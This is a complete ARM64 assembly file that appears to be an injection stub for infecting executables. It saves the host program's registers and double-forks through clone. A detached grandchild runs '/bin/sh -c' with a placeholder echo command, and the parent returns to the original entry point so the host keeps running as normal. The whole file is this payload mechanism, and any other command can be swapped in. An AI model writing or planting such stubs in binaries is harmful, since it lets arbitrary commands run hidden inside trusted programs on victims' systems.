.arch armv8-a
.global _start
.text
.align 4
_start:
    stp x29, x30, [sp, -16]!
    mov x29, sp
    stp x0, x1, [sp, -16]!
    stp x2, x3, [sp, -16]!
    stp x4, x8, [sp, -16]!

    bl clone
    cbz x0, first_child

    /* return to OEP */
    ldp x4, x8, [sp], 16
    ldp x2, x3, [sp], 16
    ldp x0, x1, [sp], 16
    ldp x29, x30, [sp], 16
    ret

first_child:
    bl clone
    cbz x0, exit

    adr x0, argv0
    adr x9, argv1
    adr x10, argv2
    stp x0, x9, [sp, -32]!
    stp x10, xzr, [sp, 16]
    mov x1, sp
    add x2, sp, 24
    mov x8, 221
    svc 0

exit:
    mov x0, 0
    mov x8, 93
    svc 0

clone:
    mov x0, 17          /* clone instead of fork on arm64 */
    mov x1, sp
    mov x2, 0
    mov x3, 0
    mov x4, 0
    mov x8, 220
    svc 0
    ret

argv0:  .asciz "/bin/sh"
argv1:  .asciz "-c"
argv2:  .asciz "echo hello from the payload"
